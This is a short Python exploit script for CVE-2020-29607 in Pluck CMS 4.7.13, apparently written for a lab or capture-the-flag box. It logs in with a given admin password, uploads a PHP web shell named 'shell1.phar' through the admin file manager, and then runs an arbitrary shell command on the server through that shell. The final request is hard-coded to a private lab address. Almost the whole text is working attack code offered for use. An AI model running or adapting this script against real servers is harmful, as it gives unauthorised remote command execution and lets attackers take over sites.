#CVE-2020-29607 Pluck CMS
#n7y

import requests
import json
import sys


if len(sys.argv) < 4:
	print("USAGE : pluck.py url password 'ls -la'")
	exit()
elif len(sys.argv) > 4:
	uri = sys.argv[1]
	passwd = sys.argv[2]
	c = ' '.join(sys.argv[3:])
else:
	uri = sys.argv[1]
	passwd = sys.argv[2]
	c = sys.argv[3]

print(uri,passwd,c)

# uri = "http://10.10.112.96/app/pluck-4.7.13/"
# passwd = "password"
# c = "id"


p = "-----------------------------238813168421505725033606482379\nContent-Disposition: form-data; name=\"filefile\"; filename=\"shell1.phar\"\nContent-Type: application/octet-stream\n\n<?php system($_GET[\"a\"]); ?>\n\n\t\n\n\n-----------------------------238813168421505725033606482379\nContent-Disposition: form-data; name=\"submit\"\n\nUpload\n-----------------------------238813168421505725033606482379--"
s = requests.Session()


#check auth
url = uri+"/login.php"

h = url.split('//')[1].split('/')[0]
origin = '/'.join(url.split('/')[:3])


info = {
    'cont1': passwd,
    'bogus': '',
    'submit': 'Log in',
}
auth = s.post(url,data=info)
print("[*] url ",uri)
print("[*] password ",passwd)
print("[*] executing ",c)
cookies_ = s.cookies.get_dict()
cookie = json.dumps(cookies_)
if "Password incorrect" in auth.text:
	print("Password incorrect")
	exit()
elif "Logging you" in auth.text:
	print("correct creds ..")

# print(cookie)
cookie = cookie.replace('"}','')
cookie = cookie.replace('{"', '')
cookie = cookie.replace('"', '')
cookie = cookie.replace(" ", '')
cookie = cookie.replace(":", '=')
header = {
	"Host": h ,
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/l337 Firefox/12321",
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
	"Accept-Language": "en-US,en;q=0.5",
	"Accept-Encoding": "gzip, deflate",
	"Content-Type": "multipart/form-data; boundary=---------------------------238813168421505725033606482379",
	"Content-Length": "3994", 
	"Origin": origin, 
	"DNT": "1",
	"Connection": "close",
	"Referer": url+"admin.php?action=files", 
	"Cookie": cookie, 
	"Upgrade-Insecure-Requests": "1",
	"Sec-GPC": "1",
}
upl = uri+"/admin.php?action=files"
upld = s.post(upl,headers=header,data=p)

if "successful!" in upld.text:
	print("success...\n")
else:
	exit()

a = s.get("http://10.10.112.96/app/pluck-4.7.13/files/shell1.phar?a="+c).text
print(a.strip())

s.close()